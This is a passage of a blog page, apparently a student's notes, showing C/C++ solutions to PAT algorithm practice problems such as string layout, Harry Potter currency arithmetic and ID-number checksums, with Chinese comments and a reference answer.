sum=(sum*0.65-1)*2;</span></span><br><span class="line"><span class="comment">    printf(&quot;%.2f&quot;,sum);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-3-1"><a href="#3-3-1" class="headerlink" title="3.3"></a>3.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1031</span></span><br><span class="line"><span class="comment">//真TM难</span></span><br><span class="line"><span class="comment">//用二维数组存answer的形式</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">81</span>];</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">30</span>][<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> N=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> n1=(N+<span class="number">2</span>)/<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> n3=n1;</span><br><span class="line">    <span class="keyword">int</span> n2=N+<span class="number">2</span>-n1-n3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n1;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n2;j++)</span><br><span class="line">            ans[i][j]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n1;i++)</span><br><span class="line">        ans[i][<span class="number">1</span>]=s[idx++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n2;i++)</span><br><span class="line">        ans[n1][i]=s[idx++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n3<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">        ans[i][n2]=s[idx++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n1;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n2;j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,ans[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1027</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    char c;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d %c&quot;,&amp;n,&amp;c);</span></span><br><span class="line"><span class="comment">    int x;</span></span><br><span class="line"><span class="comment">    x=floor(sqrt(2*(1+n)))-1;</span></span><br><span class="line"><span class="comment">    if(x%2==0) x--;</span></span><br><span class="line"><span class="comment">    int used=(x+1)*(1+x)/2-1;</span></span><br><span class="line"><span class="comment">    for(int i=x;i&gt;=1;i-=2)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;(x-i)/2;j++)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot; &quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;i;j++)</span></span><br><span class="line"><span class="comment">            printf(&quot;%c&quot;,c);</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=3;i&lt;=x;i+=2)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;(x-i)/2;j++)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot; &quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;i;j++)</span></span><br><span class="line"><span class="comment">            printf(&quot;%c&quot;,c);</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,n-used);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-5-1"><a href="#3-5-1" class="headerlink" title="3.5"></a>3.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1037</span></span><br><span class="line"><span class="comment">//自己写的，怎么改暂时都是18分，参考了一下答案，还是全换成最小单位再算简单明了</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">money</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Galleon;</span><br><span class="line">    <span class="keyword">int</span> Sickle;</span><br><span class="line">    <span class="keyword">int</span> Knut;</span><br><span class="line">&#125;temp,a,b;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">more</span><span class="params">(money a,money b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.Galleon!=b.Galleon) <span class="keyword">return</span> a.Galleon&gt;b.Galleon;</span><br><span class="line">    <span class="keyword">if</span>(a.Sickle!=b.Sickle) <span class="keyword">return</span> a.Sickle&gt;b.Sickle;</span><br><span class="line">    <span class="keyword">return</span> a.Knut&gt;b.Knut;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y,z;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d.%d.%d&quot;</span>,&amp;a.Galleon,&amp;a.Sickle,&amp;a.Knut);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d.%d.%d&quot;</span>,&amp;b.Galleon,&amp;b.Sickle,&amp;b.Knut);</span><br><span class="line">    <span class="keyword">if</span>(!more(a,b))&#123;</span><br><span class="line">        temp=a;</span><br><span class="line">        a=b;</span><br><span class="line">        b=temp;</span><br><span class="line">        <span class="comment">//exe</span></span><br><span class="line">        <span class="keyword">if</span>(a.Knut-b.Knut&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            a.Knut+=<span class="number">29</span>;</span><br><span class="line">            a.Sickle--;</span><br><span class="line">            <span class="keyword">if</span>(a.Sickle&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                a.Sickle++;</span><br><span class="line">                a.Galleon--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        z=a.Knut-b.Knut;</span><br><span class="line">        <span class="keyword">if</span>(a.Sickle-b.Sickle&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            a.Sickle+=<span class="number">17</span>;</span><br><span class="line">            a.Galleon--;</span><br><span class="line">        &#125;</span><br><span class="line">        y=a.Sickle-b.Sickle;</span><br><span class="line">        x=a.Galleon-b.Galleon;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//exe</span></span><br><span class="line">        <span class="keyword">if</span>(a.Knut-b.Knut&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            a.Knut+=<span class="number">29</span>;</span><br><span class="line">            a.Sickle--;</span><br><span class="line">            <span class="keyword">if</span>(a.Sickle&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                a.Sickle++;</span><br><span class="line">                a.Galleon--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        z=a.Knut-b.Knut;</span><br><span class="line">        <span class="keyword">if</span>(a.Sickle-b.Sickle&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            a.Sickle+=<span class="number">17</span>;</span><br><span class="line">            a.Galleon--;</span><br><span class="line">        &#125;</span><br><span class="line">        y=a.Sickle-b.Sickle;</span><br><span class="line">        x=-(a.Galleon-b.Galleon);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%d.%d&quot;</span>,x,y,z);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">标准答案</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    long int g1, g2, s1, s2, k1, k2;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%ld.%ld.%ld %ld.%ld.%ld&quot;, &amp;g1, &amp;s1, &amp;k1, &amp;g2, &amp;s2, &amp;k2);</span></span><br><span class="line"><span class="comment">    k1 = g1 * 17 * 29 + s1 * 29 + k1;</span></span><br><span class="line"><span class="comment">    k2 = g2 * 17 * 29 + s2 * 29 + k2;</span></span><br><span class="line"><span class="comment">    long int sub;</span></span><br><span class="line"><span class="comment">    sub = k2 - k1;</span></span><br><span class="line"><span class="comment">    if(sub &lt; 0)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        sub = -sub;</span></span><br><span class="line"><span class="comment">        printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int g, s, k;</span></span><br><span class="line"><span class="comment">    g = sub / (17*29);</span></span><br><span class="line"><span class="comment">    s = sub % (17*29) / 29;</span></span><br><span class="line"><span class="comment">    k = sub % (17*29) % 29;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d.%d.%d&quot;, g, s, k);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1058</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>  a,b,c,a2,b2,c2;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld.%lld.%lld %lld.%lld.%lld&quot;</span>,&amp;a,&amp;b,&amp;c,&amp;a2,&amp;b2,&amp;c2);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> sum = a*<span class="number">29</span>*<span class="number">17</span> + b*<span class="number">29</span> + c + a2*<span class="number">29</span>*<span class="number">17</span> + b2*<span class="number">29</span> + c2;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld.%lld.%lld\n&quot;</span>,sum/(<span class="number">29</span>*<span class="number">17</span>),sum%(<span class="number">17</span>*<span class="number">29</span>)/<span class="number">29</span>,sum%(<span class="number">17</span>*<span class="number">29</span>)%<span class="number">29</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1027</span></span><br><span class="line"><span class="comment">char color[14]=&#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int Red,Green,Blue;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d%d&quot;,&amp;Red,&amp;Green,&amp;Blue);</span></span><br><span class="line"><span class="comment">    printf(&quot;#&quot;);</span></span><br><span class="line"><span class="comment">    printf(&quot;%c%c&quot;,color[Red/13],color[Red%13]);</span></span><br><span class="line"><span class="comment">    printf(&quot;%c%c&quot;,color[Green/13],color[Green%13]);</span></span><br><span class="line"><span class="comment">    printf(&quot;%c%c&quot;,color[Blue/13],color[Blue%13]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1019</span></span><br><span class="line"><span class="comment">bool judge(int x[],int num)&#123;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;=num/2;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(x[i]!=x[num-1-i])</span></span><br><span class="line"><span class="comment">            return false;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return true;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,b;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;b);</span></span><br><span class="line"><span class="comment">    int x[100];</span></span><br><span class="line"><span class="comment">    int num=0;</span></span><br><span class="line"><span class="comment">    do&#123;</span></span><br><span class="line"><span class="comment">        x[num++]=N%b;</span></span><br><span class="line"><span class="comment">        N/=b;</span></span><br><span class="line"><span class="comment">    &#125;while(N!=0);</span></span><br><span class="line"><span class="comment">    bool flag=judge(x,num);</span></span><br><span class="line"><span class="comment">    if(flag) printf(&quot;Yes\n&quot;);</span></span><br><span class="line"><span class="comment">    else printf(&quot;No\n&quot;);</span></span><br><span class="line"><span class="comment">    for(int i=num-1;i&gt;=0;i--)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d&quot;,x[i]);</span></span><br><span class="line"><span class="comment">        if(i!=0) printf(&quot; &quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-6-1"><a href="#3-6-1" class="headerlink" title="3.6"></a>3.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1061</span></span><br><span class="line"><span class="keyword">char</span>* change[<span class="number">7</span>]=&#123;<span class="string">&quot;MON&quot;</span>, <span class="string">&quot;TUE&quot;</span> , <span class="string">&quot;WED&quot;</span> , <span class="string">&quot;THU&quot;</span> , <span class="string">&quot;FRI&quot;</span> , <span class="string">&quot;SAT&quot;</span> , <span class="string">&quot;SUN&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[<span class="number">65</span>];</span><br><span class="line">    <span class="keyword">char</span> str2[<span class="number">65</span>];</span><br><span class="line">    <span class="keyword">char</span> str3[<span class="number">65</span>];</span><br><span class="line">    <span class="keyword">char</span> str4[<span class="number">65</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s%s%s&quot;</span>,str1,str2,str3,str4);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n%s\n\n&quot;,str3,str4);</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str1)&amp;&amp;i&lt;<span class="built_in">strlen</span>(str2);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str1[i]==str2[i]&amp;&amp;str1[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;str1[i]&lt;=<span class="string">&#x27;G&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,change[str1[i]-<span class="string">&#x27;A&#x27;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="built_in">strlen</span>(str1)&amp;&amp;i&lt;<span class="built_in">strlen</span>(str2);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str1[i]==str2[i])&#123;</span><br><span class="line">            <span class="keyword">if</span>(str1[i]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;str1[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02d:&quot;</span>,str1[i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(str1[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;str1[i]&lt;=<span class="string">&#x27;N&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02d:&quot;</span>,str1[i]-<span class="string">&#x27;A&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str3)&amp;&amp;i&lt;<span class="built_in">strlen</span>(str4);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str3[i]==str4[i])&#123;</span><br><span class="line">            <span class="keyword">if</span>((str3[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;str3[i]&lt;=<span class="string">&#x27;Z&#x27;</span>) || (str3[i]&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;str3[i]&lt;=<span class="string">&#x27;z&#x27;</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02d&quot;</span>,i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1002</span></span><br><span class="line"><span class="comment">char* change[10]=&#123;&quot;ling&quot;,&quot;yi&quot;,&quot;er&quot;,&quot;san&quot;,&quot;si&quot;,&quot;wu&quot;,&quot;liu&quot;,&quot;qi&quot;,&quot;ba&quot;,&quot;jiu&quot;&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char str[101];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str);</span></span><br><span class="line"><span class="comment">    int n=strlen(str);</span></span><br><span class="line"><span class="comment">    int sum=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        sum+=(str[i]-&#x27;0&#x27;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int x=sum/100;</span></span><br><span class="line"><span class="comment">    int y=sum%100/10;</span></span><br><span class="line"><span class="comment">    int z=sum%100%10;</span></span><br><span class="line"><span class="comment">    if(x)&#123;</span></span><br><span class="line"><span class="comment">        for(int i=1;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(x==i)</span></span><br><span class="line"><span class="comment">                printf(&quot;%s &quot;,change[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(y==i)</span></span><br><span class="line"><span class="comment">                printf(&quot;%s &quot;,change[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(z==i)</span></span><br><span class="line"><span class="comment">                printf(&quot;%s&quot;,change[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        if(y)&#123;</span></span><br><span class="line"><span class="comment">            for(int i=1;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(y==i)</span></span><br><span class="line"><span class="comment">                    printf(&quot;%s &quot;,change[i]);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(z==i)</span></span><br><span class="line"><span class="comment">                    printf(&quot;%s&quot;,change[i]);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(z==i)</span></span><br><span class="line"><span class="comment">                    printf(&quot;%s&quot;,change[i]);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1031</span></span><br><span class="line"><span class="comment">struct temp&#123;</span></span><br><span class="line"><span class="comment">    char s[18];</span></span><br><span class="line"><span class="comment">    int flag=0;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">char check[11]=&#123;&#x27;1&#x27;,&#x27;0&#x27;,&#x27;X&#x27;,&#x27;9&#x27;,&#x27;8&#x27;,&#x27;7&#x27;,&#x27;6&#x27;,&#x27;5&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    int invalid=0;</span></span><br><span class="line"><span class="comment">    temp str[N];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s&quot;,str[i].s);</span></span><br><span class="line"><span class="comment">        int x=((int)str[i].s[0]-&#x27;0&#x27;)*7+((int)str[i].s[1]-&#x27;0&#x27;)*9+((int)str[i].s[2]-&#x27;0&#x27;)*10+</span></span><br><span class="line"><span class="comment">        ((int)str[i].s[3]-&#x27;0&#x27;)*5+((int)str[i].s[4]-&#x27;0&#x27;)*8+((int)str[i].s[5]-&#x27;0&#x27;)*4+</span></span><br><span class="line"><span class="comment">        ((int)str[i].s[6]-&#x27;0&#x27;)*2+((int)str[i].s[7]-&#x27;0&#x27;)*1+((int)str[i].s[8]-&#x27;0&#x27;)*6+</span></span><br><span class="line"><span class="comment">        ((int)str[i].s[9]-&#x27;0&#x27;)*3+((int)str[i].s[10]-&#x27;0&#x27;)*7+((int)str[i].s[11]-&#x27;0&#x27;)*9+</span></span><br><span class="line"><span class="comment">        ((int)str[i].s[12]-&#x27;0&#x27;)*10+((int)str[i].s[13]-&#x27;0&#x27;)*5+((int)str[i].s[14]-&#x27;0&#x27;)*8+</span></span><br><span class="line"><span class="comment">        ((int)str[i].s[15]-&#x27;0&#x27;)*4+((int)str[i].s[16]-&#x27;0&#x27;)*2;</span></span><br><span class="line"><span class="comment">        x%=11;</span></span><br><span class="line"><span class="comment">        char y=check[x];</span></span><br><span class="line"><span class="comment">        if(y!=str[i].s[17])&#123;</span></span><br><span class="line"><span class="comment">            invalid++;</span></span><br><span class="line"><span class="comment">            str[i].flag=1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(invalid==0) printf(&quot;All passed&quot;);</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;N;i++)</span></span><br><span class="line"><span class="comment">            if(str[i].flag==1)</span></span><br><span class="line"><span class="comment">                printf(&quot;%s\n&quot;,str[i].s);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1021</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char N[1001];</span></span><br><span class="line"><span class="comment">    int a[10]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    cin.getline(N,1001);</span></span><br><span class="line"><span class="comment">    int n=strlen(N);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        a[int(N[i])-48]++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(a[i]!=0)</span></span><br><span class="line"><span class="comment">            printf(&quot;%d:%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1006</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    int b=N/100;</span></span><br><span 